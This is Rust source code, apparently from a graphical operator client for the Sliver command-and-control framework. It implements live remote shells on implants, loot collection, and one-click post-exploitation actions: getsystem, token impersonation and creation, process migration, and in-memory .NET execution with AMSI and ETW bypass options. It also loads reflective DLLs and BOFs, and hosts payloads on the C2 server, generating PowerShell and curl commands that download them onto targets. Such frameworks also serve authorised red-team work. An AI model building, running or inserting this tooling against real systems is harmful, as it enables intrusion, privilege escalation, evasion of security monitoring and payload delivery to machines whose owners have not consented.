            if ui.button("▤ Gallery").on_hover_text("All captures, with notes").clicked() { self.pending_open.push(Tab::Gallery); }
            if let Some(tex) = self.textures.get(&key) {
                ui.colored_label(Palette::muted(), format!("{}×{}", tex.size()[0], tex.size()[1]));
            }
        });
        if to_loot {
            let host = self.sessions.iter().find(|s| s.id == key).map(|s| s.hostname.clone()).unwrap_or_else(|| short(&key).to_string());
            if let Some(shot) = self.settings.shots.iter().rev().find(|s| s.host == host) {
                if let Ok(data) = std::fs::read(&shot.file) {
                    let name = std::path::Path::new(&shot.file).file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();
                    self.op(Op::AddLoot { name, data, text: false });
                }
            }
        }
        ui.separator();
        if let Some(tex) = self.textures.get(&key) {
            egui::ScrollArea::both().auto_shrink([false, false]).show(ui, |ui| {
                let size = tex.size_vec2();
                let avail = ui.available_width();
                let scale = (avail / size.x).min(1.0);
                ui.add(egui::Image::new(tex).fit_to_exact_size(size * scale));
            });
        } else {
            ui.colored_label(Palette::muted(), "no screenshot captured");
        }
    }

    fn shell_tab(&mut self, ui: &mut egui::Ui, tunnel_id: u64) {
        if !self.shells.contains_key(&tunnel_id) {
            ui.colored_label(Palette::muted(), "shell closed");
            return;
        }
        let (pty, closed, session_id) = {
            let s = &self.shells[&tunnel_id];
            (s.pty, s.closed, s.target.session_id.clone())
        };
        ui.horizontal(|ui| {
            ui.colored_label(if closed { Palette::red() } else { Palette::green() }, if closed { "● closed" } else { "● live" });
            ui.colored_label(Palette::muted(), if pty { "pty" } else { "raw" });
            if ui.small_button("Ctrl-C").clicked() {
                self.send(Command::ShellInput { tunnel_id, session_id: session_id.clone(), data: vec![0x03] });
            }
            if ui.small_button("Clear").clicked() {
                if let Some(s) = self.shells.get_mut(&tunnel_id) {
                    s.raw.clear();
                    s.parser = vt100::Parser::new(s.rows, s.cols, 5000);
                }
            }
        });
        ui.separator();

        // Keep the remote PTY sized to the visible area.
        if pty {
            let cols = ((ui.available_width() / 8.0) as u16).clamp(40, 400);
            let rows = ((ui.available_height() / 16.0) as u16).clamp(10, 200);
            let changed = self.shells.get(&tunnel_id).map(|s| s.cols.abs_diff(cols) >= 2 || s.rows.abs_diff(rows) >= 2).unwrap_or(false);
            if changed {
                if let Some(s) = self.shells.get_mut(&tunnel_id) {
                    s.cols = cols;
                    s.rows = rows;
                    s.parser.set_size(rows, cols);
                    let target = s.target.clone();
                    let tid = s.tunnel_id;
                    self.send(Command::ShellResize { target, tunnel_id: tid, rows: rows as u32, cols: cols as u32 });
                }
            }
        }

        let text = self.shells[&tunnel_id].screen_text();
        let avail = ui.available_height() - 36.0;
        egui::ScrollArea::vertical()
            .auto_shrink([false, false])
            .max_height(avail)
            .stick_to_bottom(true)
            .show(ui, |ui| {
                ui.add(
                    egui::Label::new(egui::RichText::new(text).monospace().color(Palette::output()))
                        .wrap_mode(egui::TextWrapMode::Extend),
                );
            });

        ui.separator();
        let mut payload: Option<Vec<u8>> = None;
        if let Some(s) = self.shells.get_mut(&tunnel_id) {
            ui.horizontal(|ui| {
                ui.colored_label(Palette::green(), "❯");
                let resp = ui.add(
                    egui::TextEdit::singleline(&mut s.input)
                        .desired_width(ui.available_width() - 60.0)
                        .font(egui::TextStyle::Monospace)
                        .hint_text("input — sent with newline on Enter"),
                );
                if s.focus {
                    resp.request_focus();
                    s.focus = false;
                }
                let go = (resp.lost_focus() && ui.input(|i| i.key_pressed(egui::Key::Enter)))
                    || ui.button("Send").clicked();
                if go {
                    let mut b = std::mem::take(&mut s.input).into_bytes();
                    b.push(b'\n');
                    s.focus = true;
                    payload = Some(b);
                }
            });
        }
        if let Some(b) = payload {
            // The input box can't hide what's typed, so a line sent while the shell shows
            // a password prompt is logged as hidden.
            if let Some(s) = self.shells.get(&tunnel_id) {
                let prompt = s.screen_text().trim_end().lines().last().unwrap_or("").to_ascii_lowercase();
                let line = String::from_utf8_lossy(&b).trim_end().to_string();
                let line = if ["password", "passphrase", "passcode", "pin:"].iter().any(|w| prompt.contains(w)) { "[hidden input]".to_string() } else { line };
                self.audit(&self.implant_label(&s.target.key()), format!("shell> {line}"));
            }
            self.send(Command::ShellInput { tunnel_id, session_id: session_id.clone(), data: b });
        }
    }

    fn target_os(&self, t: &Target) -> String {
        let key = t.key();
        if let Some(s) = self.sessions.iter().find(|s| s.id == key) { return s.os.clone(); }
        if let Some(b) = self.beacons.iter().find(|b| b.id == key) { return b.os.clone(); }
        "windows".into()
    }

    fn target_arch(&self, t: &Target) -> String {
        let key = t.key();
        if let Some(s) = self.sessions.iter().find(|s| s.id == key) { return s.arch.clone(); }
        if let Some(b) = self.beacons.iter().find(|b| b.id == key) { return b.arch.clone(); }
        "amd64".into()
    }

    fn modules_tab(&mut self, ui: &mut egui::Ui, target: Target) {
        let key = target.key();
        let mut form = self.module_forms.remove(&key).unwrap_or_default();
        let mut spec: Option<ModuleSpec> = None;
        // Only offer what the implant's OS supports: token/privilege actions, assembly,
        // spawndll and BOFs are Windows-only; sideload (.so/.dylib) and extensions aren't.
        let win = self.target_os(&target) == "windows";
        if !win {
            if matches!(form.kind, ModKind::Assembly | ModKind::SpawnDll | ModKind::Bof) {
                form.kind = ModKind::Sideload;
            }
            // The form defaults to a Windows host process; give unix sideload a unix one.
            if form.process.to_ascii_lowercase().starts_with("c:\\") { form.process = "/bin/sh".into(); }
            form.is_dll = false;
        }

        // Quick one-click post-exploitation actions.
        let mut quick: Option<ModuleSpec> = None;
        ui.horizontal_wrapped(|ui| {
            ui.colored_label(Palette::muted(), "Quick:");
            if win {
                if ui.button("whoami").clicked() { quick = Some(ModuleSpec::WhoAmI); }
                if ui.button("getprivs").clicked() { quick = Some(ModuleSpec::GetPrivs); }
                if ui.button("getsystem").clicked() { quick = Some(ModuleSpec::GetSystem { process: "spoolsv.exe".into() }); }
                if ui.button("rev2self").clicked() { quick = Some(ModuleSpec::RevToSelf); }
            }
            if ui.button("ifconfig").clicked() { quick = Some(ModuleSpec::Ifconfig); }
            if ui.button("netstat").clicked() { quick = Some(ModuleSpec::Netstat); }
            if ui.button("env").clicked() { quick = Some(ModuleSpec::GetEnv); }
            if !win { return; }
            ui.separator();
            ui.label("migrate");
            ui.add(egui::TextEdit::singleline(&mut form.migrate_pid).desired_width(60.0).hint_text("pid"));
            if ui.button("↪").on_hover_text("migrate into pid").clicked() {
                if let Ok(pid) = form.migrate_pid.trim().parse::<u32>() {
                    quick = Some(ModuleSpec::Migrate { pid, process: String::new() });
                }
            }
            ui.label("impersonate");
            ui.add(egui::TextEdit::singleline(&mut form.imp_user).desired_width(110.0).hint_text("DOMAIN\\user"));
            if ui.button("⇄").on_hover_text("impersonate logged-on user").clicked() && !form.imp_user.trim().is_empty() {
                quick = Some(ModuleSpec::Impersonate { username: form.imp_user.trim().to_string() });
            }
        });
        if win { ui.horizontal_wrapped(|ui| {
            ui.colored_label(Palette::muted(), "make-token:");
            ui.add(egui::TextEdit::singleline(&mut form.tok_user).desired_width(110.0).hint_text("user"));
            ui.add(egui::TextEdit::singleline(&mut form.tok_pass).desired_width(110.0).hint_text("password"));
            ui.add(egui::TextEdit::singleline(&mut form.tok_domain).desired_width(90.0).hint_text("domain"));
            if ui.button("create token").clicked() && !form.tok_user.trim().is_empty() {
                quick = Some(ModuleSpec::MakeToken {
                    username: form.tok_user.trim().to_string(),
                    password: form.tok_pass.clone(),
                    domain: form.tok_domain.trim().to_string(),
                    logon_type: 2,
                });
            }
        }); }
        if let Some(spec) = quick {
            self.send(Command::Module { target: target.clone(), spec });
            self.pending_open.push(Tab::Console(target.clone()));
            self.set_toast(true, "action dispatched — results in console");
        }
        ui.separator();

        ui.horizontal(|ui| {
            if win { ui.selectable_value(&mut form.kind, ModKind::Assembly, ".NET Assembly"); }
            ui.selectable_value(&mut form.kind, ModKind::Sideload, "Sideload");
            if win {
                ui.selectable_value(&mut form.kind, ModKind::SpawnDll, "Spawn DLL");
                ui.selectable_value(&mut form.kind, ModKind::Bof, "BOF");
            }
            ui.selectable_value(&mut form.kind, ModKind::Extension, "Extensions");
            ui.selectable_value(&mut form.kind, ModKind::Wasm, "WASM");
            ui.selectable_value(&mut form.kind, ModKind::Env, "Environment");
        });
        ui.separator();
        let mut op: Option<Op> = None;

        egui::ScrollArea::vertical().auto_shrink([false, false]).show(ui, |ui| match form.kind {
            ModKind::Assembly => {
                ui.colored_label(Palette::muted(), "Run a managed .NET assembly in memory.");
                file_row(ui, "Assembly (.exe/.dll)", &mut form.file, &["exe", "dll"]);
                text_row(ui, "Arguments", &mut form.args);
                text_row(ui, "Host process", &mut form.process);
                ui.horizontal(|ui| {
                    ui.checkbox(&mut form.is_dll, ".NET DLL");
                    ui.checkbox(&mut form.amsi_bypass, "AMSI bypass");
                    ui.checkbox(&mut form.etw_bypass, "ETW bypass");
                });
                if form.is_dll {
                    text_row(ui, "Class name", &mut form.class_name);
                    text_row(ui, "Method", &mut form.method);
                }
                if run_button(ui, !form.file.is_empty()) {
                    match std::fs::read(&form.file) {
                        Ok(data) => spec = Some(ModuleSpec::ExecuteAssembly {
                            data, args: split_ws(&form.args), process: form.process.clone(), is_dll: form.is_dll,
                            amsi_bypass: form.amsi_bypass, etw_bypass: form.etw_bypass,
                            class_name: form.class_name.clone(), method: form.method.clone(), arch: form.arch.clone(),
                        }),
                        Err(_) => { /* reported below via toast */ }
                    }
                }
            }
            ModKind::Sideload => {
                ui.colored_label(Palette::muted(), "Load a shared library into a host process and call an export.");
                file_row(ui, "Library", &mut form.file, &["dll", "so", "dylib", "bin"]);
                text_row(ui, "Arguments", &mut form.args);
                text_row(ui, "Entry point", &mut form.entry_point);
                text_row(ui, "Host process", &mut form.process);
                if win { ui.checkbox(&mut form.is_dll, "reflective DLL"); }
                if run_button(ui, !form.file.is_empty()) {
                    if let Ok(data) = std::fs::read(&form.file) {
                        spec = Some(ModuleSpec::Sideload {
                            data, args: form.args.clone(), entry_point: form.entry_point.clone(),
                            process: form.process.clone(), is_dll: form.is_dll,
                        });
                    }
                }
            }
            ModKind::SpawnDll => {
                ui.colored_label(Palette::muted(), "Spawn a host process and load a reflective DLL into it.");
                file_row(ui, "Reflective DLL", &mut form.file, &["dll", "bin"]);
                text_row(ui, "Arguments", &mut form.args);
                text_row(ui, "Entry point", &mut form.entry_point);
                text_row(ui, "Host process", &mut form.process);
                if run_button(ui, !form.file.is_empty()) {
                    if let Ok(data) = std::fs::read(&form.file) {
                        spec = Some(ModuleSpec::SpawnDll {
                            data, args: form.args.clone(), entry_point: form.entry_point.clone(), process: form.process.clone(),
                        });
                    }
                }
            }
            ModKind::Bof => {
                ui.colored_label(Palette::muted(), "Run a COFF object via the coff-loader extension.");
                ui.colored_label(Palette::yellow(), "Register the coff-loader extension first (Extensions tab).");
                file_row(ui, "Object (.o)", &mut form.file, &["o", "obj", "bin"]);
                text_row(ui, "Entry export", &mut form.ext_export);
                text_row(ui, "Packed args (hex)", &mut form.args);
                if run_button(ui, !form.file.is_empty()) {
                    if let Ok(data) = std::fs::read(&form.file) {
                        spec = Some(ModuleSpec::CallExtension {
                            name: "coff-loader".into(),
                            export: if form.ext_export.is_empty() { "go".into() } else { form.ext_export.clone() },
                            args: parse_hex(&form.args), is_bof: true, bof_data: data,
                        });
                    }
                }
            }
            ModKind::Extension => {
                let loaded = self.extensions.get(&key).cloned().unwrap_or_default();
                ui.horizontal(|ui| {
                    if ui.button("⟳ List loaded").clicked() {
                        self.send(Command::ListExtensions { target: target.clone() });
                    }
                    ui.colored_label(Palette::muted(), if loaded.is_empty() { "none loaded".into() } else { loaded.join(", ") });
                });

                // Extensions installed from the armory, ready to push onto this implant.
                ui.add_space(6.0);
                ui.label(egui::RichText::new("Installed (from Armory)").strong());
                let os = self.target_os(&target);
                let arch = self.target_arch(&target);
                if self.installed_exts.is_empty() {
                    ui.colored_label(Palette::muted(), "none installed — grab some from the Armory tab");
                } else {
                    egui::ScrollArea::vertical().max_height(150.0).show(ui, |ui| {
                        for ext in self.installed_exts.iter().filter(|e| win || !e.is_bof) {
                            ui.horizontal(|ui| {
                                ui.label(egui::RichText::new(&ext.name).strong());
                                ui.colored_label(Palette::muted(), format!("v{}", ext.version.trim_start_matches('v')));
                                if ext.is_bof {
                                    ui.colored_label(Palette::purple(), "BOF");
                                }
                                ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                                    if ext.is_bof {
                                        if ui.small_button("→ BOF tab").clicked() {
                                            if let Some(f) = ext.file_for(&os, &arch) {
                                                form.file = ext.root.join(&f.path).display().to_string();
                                                form.kind = ModKind::Bof;
                                            }
                                        }
                                    } else if ui.small_button("▶ Load onto implant").clicked() {
                                        if let Some(f) = ext.file_for(&os, &arch) {
                                            if let Ok(data) = std::fs::read(ext.root.join(&f.path)) {
                                                spec = Some(ModuleSpec::RegisterExtension {
                                                    name: ext.command_name.clone(),
                                                    data,
                                                    os: os.clone(),
                                                    init: ext.init.clone(),
                                                });
                                            }
                                        }
                                    }
                                });
                            });
                        }
                    });
                }

                ui.add_space(6.0);
                ui.label(egui::RichText::new("Register extension (manual)").strong());
                file_row(ui, "Binary", &mut form.file, &["dll", "so", "o", "bin"]);
                text_row(ui, "Name", &mut form.ext_name);
                text_row(ui, "Init export", &mut form.ext_init);
                if ui.add_enabled(!form.file.is_empty() && !form.ext_name.is_empty(), egui::Button::new("Register")).clicked() {
                    if let Ok(data) = std::fs::read(&form.file) {
                        spec = Some(ModuleSpec::RegisterExtension {
                            name: form.ext_name.clone(), data, os: self.target_os(&target), init: form.ext_init.clone(),
                        });
                    }
                }
                ui.add_space(8.0);
                ui.label(egui::RichText::new("Call extension").strong());
                text_row(ui, "Name", &mut form.ext_name);
                text_row(ui, "Export", &mut form.ext_export);
                text_row(ui, "Args (hex)", &mut form.args);
                ui.checkbox(&mut form.ext_is_bof, "is BOF");
                if ui.add_enabled(!form.ext_name.is_empty(), egui::Button::new("Call")).clicked() {
                    spec = Some(ModuleSpec::CallExtension {
                        name: form.ext_name.clone(), export: form.ext_export.clone(),
                        args: parse_hex(&form.args), is_bof: form.ext_is_bof, bof_data: Vec::new(),
                    });
                }
            }
            ModKind::Wasm => {
                ui.colored_label(Palette::muted(), "WebAssembly extensions run inside the implant's WASM runtime (any OS).");
                let loaded = self.ext.wasm.get(&key).cloned().unwrap_or_default();
                ui.horizontal(|ui| {
                    if ui.button("⟳ List loaded").clicked() { op = Some(Op::WasmList { target: target.clone() }); }
                    ui.colored_label(Palette::muted(), if loaded.is_empty() { "none loaded".into() } else { loaded.join(", ") });
                });
                ui.add_space(6.0);
                ui.label(egui::RichText::new("Register").strong());
                file_row(ui, "Module (.wasm)", &mut form.wasm_file, &["wasm"]);
                if form.wasm_name.is_empty() && !form.wasm_file.is_empty() {
                    form.wasm_name = std::path::Path::new(&form.wasm_file).file_stem().map(|s| s.to_string_lossy().to_string()).unwrap_or_default();
                }
                text_row(ui, "Name", &mut form.wasm_name);
                if ui.add_enabled(!form.wasm_file.is_empty() && !form.wasm_name.trim().is_empty(), egui::Button::new("Register")).clicked() {
                    match std::fs::read(&form.wasm_file) {
                        Ok(wasm) => op = Some(Op::WasmRegister { target: target.clone(), name: form.wasm_name.trim().to_string(), wasm }),
                        Err(e) => self.set_toast(false, &format!("read {}: {e}", form.wasm_file)),
                    }
                }
                ui.add_space(8.0);
                ui.label(egui::RichText::new("Run").strong());
                text_row(ui, "Name", &mut form.wasm_name);
                text_row(ui, "Arguments", &mut form.wasm_args);
                if run_button(ui, !form.wasm_name.trim().is_empty()) {
                    op = Some(Op::WasmExec { target: target.clone(), name: form.wasm_name.trim().to_string(), args: split_ws(&form.wasm_args) });
                }
            }
            ModKind::Env => {
                ui.colored_label(Palette::muted(), "The implant process's environment variables.");
                if ui.button("Show all (getenv)").clicked() { spec = Some(ModuleSpec::GetEnv); }
                ui.add_space(6.0);
                text_row(ui, "Name", &mut form.env_key);
                text_row(ui, "Value", &mut form.env_value);
                let has_key = !form.env_key.trim().is_empty();
                ui.horizontal(|ui| {
                    if ui.add_enabled(has_key, egui::Button::new(egui::RichText::new("Set").strong())).clicked() {
                        op = Some(Op::SetEnv { target: target.clone(), key: form.env_key.trim().to_string(), value: form.env_value.clone() });
                    }
                    if ui.add_enabled(has_key, egui::Button::new("Unset")).clicked() {
                        op = Some(Op::UnsetEnv { target: target.clone(), key: form.env_key.trim().to_string() });
                    }
                });
            }
        });
        if let Some(o) = op {
            let to_console = !matches!(o, Op::WasmList { .. });
            self.op(o);
            if to_console {
                self.pending_open.push(Tab::Console(target.clone()));
                self.set_toast(true, "dispatched — results in console");
            }
        }

        if let Some(s) = spec {
            self.send(Command::Module { target: target.clone(), spec: s });
            self.pending_open.push(Tab::Console(target.clone()));
            self.set_toast(true, "module dispatched — results in console");
        }
        self.module_forms.insert(key, form);
    }

    // ------------------------------------------------------------ Hosted files
    /// Files hosted on the Sliver server as website content. Any HTTP(S)
    /// listener started with `Website = <name>` serves that site's paths
    /// (other paths still go to the C2 handler).
    fn hosting_tab(&mut self, ui: &mut egui::Ui) {
        use egui_extras::Column;
        ui.horizontal(|ui| {
            if ui.button("⟳ Refresh").clicked() { self.send(Command::RefreshWebsites); }
            ui.colored_label(Palette::muted(), "files hosted on the Sliver server — downloadable via an HTTP(S) listener");
        });
        ui.separator();

        // ---- Upload form ----
        ui.label(egui::RichText::new("Host a file").strong());
        let websites = self.websites.clone();
        let f = &mut self.host_form;
        ui.horizontal(|ui| {
            ui.label("File:");
            if ui.button("Choose file…").clicked() {
                if let Some(p) = rfd::FileDialog::new().pick_file() {
                    let name = p.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();
                    f.web_path = format!("/{name}");
                    f.content_type = guess_content_type(&name).into();
                    f.file = Some(p);
                }
            }
            let picked = f.file.as_ref().map(|p| p.display().to_string()).unwrap_or_else(|| "none selected".into());
            ui.colored_label(if f.file.is_some() { Palette::text() } else { Palette::muted() }, picked);
        });
        ui.horizontal(|ui| {
            ui.label("Web path:");
            ui.add(egui::TextEdit::singleline(&mut f.web_path).desired_width(200.0).font(egui::TextStyle::Monospace));
            ui.label("Content-Type:");
            ui.add(egui::TextEdit::singleline(&mut f.content_type).desired_width(170.0));
            ui.label("Website:");
            ui.add(egui::TextEdit::singleline(&mut f.website).desired_width(100.0))
                .on_hover_text("Sliver website (content group) — created on first upload");
            egui::ComboBox::from_id_salt("host-website")
                .selected_text("")
                .width(24.0)
                .show_ui(ui, |ui| {
                    for w in &websites {
                        ui.selectable_value(&mut f.website, w.name.clone(), &w.name);
                    }
                });
        });
        let can_host = f.file.is_some() && !f.website.trim().is_empty() && !f.web_path.trim().is_empty();
        let mut host_req = None;
        if ui.add_enabled(can_host, egui::Button::new(egui::RichText::new("⬆ Upload & host").strong())).clicked() {
            if let Some(p) = f.file.take() {
                host_req = Some((p, f.website.trim().to_string(), f.web_path.trim().to_string(), f.content_type.trim().to_string()));
            }
        }
        if let Some((p, website, path, content_type)) = host_req {
            match std::fs::read(&p) {
                Ok(data) => {
                    let original_file = p.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();
                    let content_type = if content_type.is_empty() { "application/octet-stream".into() } else { content_type };
                    self.send(Command::HostFile { website, path, content_type, data, original_file });
                }
                Err(e) => self.set_toast(false, &format!("read {}: {e}", p.display())),
            }
        }

        // ---- Which listener serves it ----
        // Job info doesn't say which website a listener serves, so the operator
        // picks the HTTP(S) listener to build download URLs from.
        ui.add_space(6.0);
        let http_jobs: Vec<clientpb::Job> = self.jobs.iter()
            .filter(|j| matches!(j.protocol.as_str(), "http" | "https") || matches!(j.name.as_str(), "http" | "https"))
            .cloned()
            .collect();
        if self.host_form.serve_job.map_or(true, |id| !http_jobs.iter().any(|j| j.id == id)) {
            self.host_form.serve_job = http_jobs.first().map(|j| j.id);
        }
        let lhost = self.configs.get(self.selected_cfg).map(|c| c.lhost.clone()).unwrap_or_default();
        let job_label = |j: &clientpb::Job| format!("job {} · {} :{}", j.id, j.name, j.port);
        let base = http_jobs.iter().find(|j| Some(j.id) == self.host_form.serve_job).map(|j| {
            let scheme = if j.name == "https" || j.protocol == "https" { "https" } else { "http" };
            let default_port = if scheme == "https" { 443 } else { 80 };
            if j.port == default_port { format!("{scheme}://{lhost}") } else { format!("{scheme}://{lhost}:{}", j.port) }
        });
        ui.horizontal(|ui| {
            ui.label("Serve via:");
            if http_jobs.is_empty() {
                ui.colored_label(Palette::yellow(), "no HTTP(S) listener running");
            } else {
                let sel = http_jobs.iter().find(|j| Some(j.id) == self.host_form.serve_job).map(job_label).unwrap_or_default();
                egui::ComboBox::from_id_salt("host-serve-job")
                    .selected_text(sel)
                    .show_ui(ui, |ui| {
                        for j in &http_jobs {
                            ui.selectable_value(&mut self.host_form.serve_job, Some(j.id), job_label(j));
                        }
                    });
            }
            if ui.button("≡ Start listener for this website…").clicked() {
                // Plain HTTP by default: no self-signed cert for the target's
                // download tool to reject.
                self.listener_form.kind = 1;
                self.listener_form.secure = false;
                if self.listener_form.port == 8888 { self.listener_form.port = 80; }
                self.listener_form.website = self.host_form.website.trim().to_string();
                self.show_listeners = true;
            }
        });
        ui.colored_label(Palette::muted(),
            "URLs resolve only on a listener started with that website. HTTPS listeners use a self-signed cert unless you supply one.");
        ui.separator();

        // ---- Hosted content ----
        if websites.is_empty() {
            ui.add_space(14.0);
            ui.vertical_centered(|ui| ui.colored_label(Palette::muted(), "No files hosted yet — choose a file above"));
            return;
        }
        let rows: Vec<(String, clientpb::WebContent)> = websites.iter()
            .flat_map(|w| {
                let mut c: Vec<_> = w.contents.values().cloned().map(|x| (w.name.clone(), x)).collect();
                c.sort_by(|a, b| a.1.path.cmp(&b.1.path));
                c
            })
            .collect();
        // Inline Content-Type editor.
        let mut set_ct: Option<(String, String, String)> = None;
        let mut cancel_ct = false;
        if let Some((site, path, ct)) = &mut self.ext.hosted_ct {
            ui.horizontal(|ui| {
                ui.label(egui::RichText::new("Content type").strong());
                ui.colored_label(Palette::muted(), egui::RichText::new(format!("{site}{path}")).monospace());
                let r = ui.add(egui::TextEdit::singleline(ct).desired_width(220.0).font(egui::TextStyle::Monospace));
                let enter = r.lost_focus() && ui.input(|i| i.key_pressed(egui::Key::Enter));
                if (ui.button(egui::RichText::new("Save").strong()).clicked() || enter) && !ct.trim().is_empty() {
                    set_ct = Some((site.clone(), path.clone(), ct.trim().to_string()));
                }
                if ui.button("Cancel").clicked() { cancel_ct = true; }
            });
        }
        if let Some((website, path, content_type)) = set_ct {
            self.ext.hosted_ct = None;
            self.op(Op::SetHostedContentType { website, path, content_type });
        } else if cancel_ct {
            self.ext.hosted_ct = None;
        }
        let mut edit_ct: Option<(String, String, String)> = None;
        let mut unhost: Option<(String, String)> = None;
        let mut replace: Option<(String, String)> = None;
        let mut remove_site: Option<String> = None;
        ui.horizontal_wrapped(|ui| {
            ui.label("Websites:");
            for w in &websites {
                ui.colored_label(Palette::purple(), format!("{} ({})", w.name, w.contents.len()));
                if ui.small_button(egui::RichText::new("✕").color(Palette::red())).on_hover_text("Remove website and all its files").clicked() {
                    remove_site = Some(w.name.clone());
                }
            }
        });
        kit::table(ui)
            .striped(true)
            .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
            .column(Column::auto().at_least(80.0))
            .column(Column::auto().at_least(150.0))
            .column(Column::auto().at_least(70.0))
            .column(Column::remainder().at_least(240.0))
            .column(Column::auto().at_least(250.0))
            .header(22.0, |mut h| {
                for t in ["Website", "Path", "Size", "Download URL", ""] { h.col(|ui| { ui.strong(t); }); }
            })
            .body(|mut body| {
                for (site, x) in &rows {
                    body.row(24.0, |mut row| {
                        row.col(|ui| { ui.colored_label(Palette::purple(), site); });
                        row.col(|ui| {
                            ui.monospace(&x.path).on_hover_text(format!("{}\nSHA-256 {}\nfrom {}", x.content_type, x.sha256, x.original_file));
                        });
                        row.col(|ui| { ui.colored_label(Palette::muted(), human_size(x.size as i64)); });
                        // Sliver servers before the May 2026 "Duplicate HTML Fix" send website
                        // content twice unless the URL carries a numeric query parameter, which
                        // corrupts binaries. `?v=1` is harmless on fixed servers.
                        let url = base.as_ref().map(|b| format!("{b}{}?v=1", x.path));
                        row.col(|ui| match &url {
                            Some(u) => { ui.add(egui::Label::new(egui::RichText::new(u).monospace().color(Palette::accent())).truncate()); }
                            None => { ui.colored_label(Palette::muted(), "start an HTTP(S) listener for this website"); }
                        });
                        row.col(|ui| {
                            if let Some(u) = &url {
                                let file = x.path.rsplit('/').next().filter(|n| !n.is_empty()).unwrap_or("download").to_string();
                                let insecure = u.starts_with("https");
                                if ui.small_button("📋 URL").on_hover_text(u).clicked() {
                                    ui.ctx().copy_text(u.clone());
                                }
                                // Sliver's HTTP listener drops a response after ~60 s, and
                                // Windows PowerShell's progress bar slows a 40 MB download past that.
                                let ps = format!("$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri '{u}' -OutFile '{file}'");
                                if ui.small_button("📋 PS").on_hover_text(&ps).clicked() {
                                    ui.ctx().copy_text(ps);
                                }
                                let curl = format!("curl -s{} -o {file} '{u}'", if insecure { "k" } else { "" });
                                if ui.small_button("📋 curl").on_hover_text(&curl).clicked() {
                                    ui.ctx().copy_text(curl);
                                }
                            }
                            if ui.small_button("⟳").on_hover_text("Replace this file's content (same URL)").clicked() {
                                replace = Some((site.clone(), x.path.clone()));
                            }
                            if ui.small_button("✎").on_hover_text(format!("Change the Content-Type (now {})", x.content_type)).clicked() {
                                edit_ct = Some((site.clone(), x.path.clone(), x.content_type.clone()));
                            }
                            if ui.small_button(egui::RichText::new("✕").color(Palette::red())).on_hover_text("Stop hosting").clicked() {
                                unhost = Some((site.clone(), x.path.clone()));
                            }
                        });
                    });
                }
            });
        if let Some((website, path)) = unhost {
            self.send(Command::UnhostFile { website, path });
        }
        if edit_ct.is_some() { self.ext.hosted_ct = edit_ct; }
        if let Some((website, path)) = replace {
            if let Some(p) = rfd::FileDialog::new().pick_file() {
                match std::fs::read(&p) {
                    Ok(data) => {
                        let original_file = p.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();
                        let content_type = guess_content_type(&original_file).to_string();
                        self.op(Op::ReplaceHostedFile { website, path, content_type, data, original_file });
                    }
                    Err(e) => self.set_toast(false, &format!("read {}: {e}", p.display())),
                }
            }
        }
        if let Some(name) = remove_site {
            self.send(Command::RemoveWebsite { name });
        }
    }

    // ------------------------------------------------------------ Armory
    fn armory_tab(&mut self, ui: &mut egui::Ui) {
        use egui_extras::Column;
        let ctx = ui.ctx().clone();
        ui.horizontal(|ui| {
            if ui.add_enabled(!self.armory_busy, egui::Button::new("⟳ Fetch / refresh index")).clicked() {
                self.armory_fetch(&ctx);
            }
            if self.armory_busy {
                ui.spinner();
            }
            ui.colored_label(Palette::muted(), &self.armory_status);
            ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                ui.add(egui::TextEdit::singleline(&mut self.armory_search).hint_text("search…").desired_width(200.0));
                ui.colored_label(Palette::muted(), "");
            });
        });
        ui.colored_label(Palette::muted(), "Packages are downloaded from the official armory and verified by minisign signature before install.");
        ui.separator();

        let Some(index) = self.armory_index.clone() else {
            // Auto-load the catalog the first time this tab is shown.
            if !self.armory_busy {
                self.armory_fetch(&ctx);
            }
            ui.add_space(20.0);
            ui.vertical_centered(|ui| {
                ui.spinner();
                ui.colored_label(Palette::muted(), "loading armory catalog…");
            });
            return;
        };

        let needle = self.armory_search.to_lowercase();
        let installed: std::collections::HashSet<String> =
            self.installed_exts.iter().map(|e| e.command_name.clone()).collect();
        let mut rows: Vec<&Package> = index
            .extensions
            .iter()
            .filter(|p| needle.is_empty() || p.name.to_lowercase().contains(&needle) || p.command_name.to_lowercase().contains(&needle))
            .collect();
        rows.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));

        let mut to_install: Option<Package> = None;
        kit::table(ui)
            .striped(true)
            .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
            .column(Column::auto().at_least(200.0))
            .column(Column::auto().at_least(150.0))
            .column(Column::remainder().at_least(240.0))
            .column(Column::auto().at_least(110.0))
            .header(22.0, |mut h| {
                for t in ["Extension", "Command", "Repo", "Action"] {
                    h.col(|ui| { ui.strong(t); });
                }
            })
            .body(|mut body| {
                for p in &rows {
                    body.row(24.0, |mut row| {
                        row.col(|ui| { ui.label(&p.name); });
                        row.col(|ui| { ui.monospace(&p.command_name); });
                        row.col(|ui| { ui.colored_label(Palette::muted(), p.repo_url.trim_start_matches("https://")); });
                        row.col(|ui| {
                            if self.installing.contains(&p.command_name) {
                                ui.add(egui::Spinner::new());
                                ui.colored_label(Palette::muted(), "installing");
                            } else if installed.contains(&p.command_name) {
                                ui.colored_label(Palette::green(), "✓ installed");
                                if ui.small_button("reinstall").clicked() {
                                    to_install = Some((*p).clone());
                                }
                            } else if ui.button("↓ Install").clicked() {
                                to_install = Some((*p).clone());
                            }
                        });
                    });
                }
            });
        if let Some(pkg) = to_install {
            self.armory_install(pkg, &ctx);
        }
    }

    // ------------------------------------------------------------ Session graph
    fn graph_tab(&mut self, ui: &mut egui::Ui) {
        kit::toolbar(ui, |ui| {
            if ui.button("⟳ Refresh").clicked() {
                self.send(Command::RefreshAll);
                self.send(Command::RefreshPivots);
            }
            if ui.button("⤢ Reset layout").on_hover_text("Re-arrange hosts automatically").clicked() {
                self.graph_pos.clear();
                self.settings_dirty = true;
            }
            ui.colored_label(Palette::muted(), "hover for details · click to open its console · drag to reposition");
            ui.separator();
            legend(ui, Palette::red(), "SYSTEM/High/root");
            legend(ui, Palette::accent(), "User");
            legend(ui, Palette::muted(), "Beacon");
            ui.colored_label(Palette::green(), "live");
            ui.colored_label(Palette::red(), "dead");
